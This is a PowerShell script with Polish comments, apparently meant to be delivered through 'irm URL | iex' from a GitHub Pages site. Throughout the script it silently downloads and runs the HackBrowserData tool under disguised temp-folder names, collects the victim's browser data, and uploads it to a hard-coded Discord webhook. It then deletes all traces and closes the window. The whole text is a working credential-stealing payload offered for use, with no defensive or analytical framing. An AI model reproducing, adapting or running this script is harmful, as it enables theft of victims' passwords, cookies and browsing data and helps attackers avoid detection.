# Cichy skrypt OPSEC-safe dla GitHub Pages
# Cel: Pobranie, wykonanie HackBrowserData i wysłanie danych na Discord

# 1. Definicje ścieżek i URLi
$zipUrl = "https://github.com/moonD4rk/HackBrowserData/releases/download/v0.4.6/hack-browser-data-windows-64bit.zip"
$zipPath = "$env:temp\~tmp8432.zip" # Losowa nazwa pliku
$installDir = "$env:temp\~SysCache32" # Nazwa folderu imitująca systemowy
$discordWebhookUrl = "https://discord.com/api/webhooks/1413524885111832596/2_rzIGqOg_nFgYpCj_nMQwR_usBosXQF97gwGWGiW8w-7xB9JCWBg0kpxaLvyHfPUAkB" # <--- ZASTĄP TYM!

# 2. Pobierz HackBrowserData cicho
try {
    $progressPreference = 'silentlyContinue'
    Invoke-WebRequest -Uri $zipUrl -OutFile $zipPath -UserAgent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" -UseBasicParsing
} catch { exit 1 }

# 3. Wypakuj archiwum
try {
    New-Item -ItemType Directory -Path $installDir -Force | Out-Null
    Add-Type -AssemblyName System.IO.Compression.FileSystem
    [System.IO.Compression.ZipFile]::ExtractToDirectory($zipPath, $installDir)
} catch { exit 1 }

# 4. Uruchom HackBrowserData i ukradnij dane
try {
    $psi = New-Object System.Diagnostics.ProcessStartInfo
    $psi.FileName = "$installDir\hack-browser-data.exe"
    $psi.Arguments = "--quiet --format json --dir $env:temp"
    $psi.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
    $psi.CreateNoWindow = $true
    $psi.UseShellExecute = $false
    $process = [System.Diagnostics.Process]::Start($psi)
    $process.WaitForExit(30000)
} catch { exit 1 }

# 5. Wyślij dane na Discord (jeśli istnieją)
$resultFile = "$env:temp\result.zip"
if (Test-Path -Path $resultFile -ErrorAction SilentlyContinue) {
    try {
        $boundary = [System.Guid]::NewGuid().ToString()
        $fileBytes = [System.IO.File]::ReadAllBytes($resultFile)
        $enc = [System.Text.Encoding]::GetEncoding('iso-8859-1')
        $fileContent = $enc.GetString($fileBytes)
        $bodyLines = (
            "--$boundary",
            "Content-Disposition: form-data; name=`"file`"; filename=`"logs.zip`"",
            "Content-Type: application/zip",
            "",
            $fileContent,
            "--$boundary--"
        ) -join "`r`n"
        
        Invoke-WebRequest -Uri $discordWebhookUrl -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $bodyLines -UserAgent "Mozilla/5.0" -UseBasicParsing
    } catch { }
}

# 6. Sprzątanie - usuń wszystkie ślady
Start-Sleep -Seconds 2
Remove-Item -Path $zipPath, $installDir, $resultFile -Recurse -Force -ErrorAction SilentlyContinue

# 7. Cicho zamknij okno PowerShell (tylko jeśli było otwarte)
# Jeśli skrypt został uruchomiony via "irm URL | iex", to okno i tak należy zamknąć ręcznie.
# Ta linia spróbuje je zamknąć, jeśli to możliwe.
try { $host.SetShouldExit(0) } catch { }
